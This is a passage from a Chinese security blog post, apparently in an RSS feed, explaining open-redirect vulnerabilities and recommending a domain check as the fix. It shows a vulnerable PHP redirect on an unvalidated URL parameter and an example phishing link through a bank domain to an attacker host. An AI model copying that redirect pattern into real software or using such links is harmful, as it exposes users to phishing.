<span class="ez-toc-section" id="URL%E8%B7%B3%E8%BD%AC"></span>URL跳转<span class="ez-toc-section-end"></span>
</h4>
<p>URL跳转很有可能会成为攻击利用的工具。</p>
<p>比如下面的PHP代码：</p>
<p></p>
<pre data-enlighter-language="php" class="EnlighterJSRAW">$redirect_url = $_GET['url'];
header("Location: " . $redirect_url);</pre>
<p>这样的代码可能很常见，比如当用户在访问你的网站某个页观的时候没有权限，于是你的网站跳转到登录页面，当然登录完成后又跳转回刚才他访问的那个页面。一般来说，我们都会在跳转到登录页面时在URL里加上要被跳转过去的网页。于是会出现上述那样的代码。</p>
<p>于是我们就可以通过下面的URL，跳转到一个恶意网站上，而那个网站上可能有一段CSRF的代码在等着你，或是一个钓鱼网站。</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">http://bank.example.com/redirect?url=http://attacker.example.net</code></p>
<p>这种攻击具有的迷惑性在于，用户看到的http://bank.example.com，<strong>以为是一个合法网站，于是就点了这个链接，结果通过这个合法网站，把用户带到了一个恶意网站，而这个恶意网站上可能把页面做得跟这个合法网站一模一样，你还以为访问的是正确的地方，结果就被钓鱼了</strong>。</p>
<p>解决这个问题很简单，你需要在你的后台判断一下传过来的URL的域名是不是你自己的域名。</p>
<p>你可以看看Google和Baidu搜索引擎的链接跳转，百度的跳转链接是被加密过的，而Google的网站链接很长，里面有网站的明文，但是会有几个加密过的参数，如果你把那些参数移除掉，Google会显示一个重定向的提醒页面。（我个人觉得还是Google做得好）</p>
<p>（本篇文章结束）</p>
<p>这段时间工作和家里的事比较多，所以时间有限，更新不快，而此篇行文比较仓促，欢迎大家补充，并指出我文中的问题。</p>
 ]]></content>
<pubDate>2012-12-10T08:34:48+08:00</pubDate>
<guid>https://coolshell.cn/articles/8711.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
</channel>
</rss>
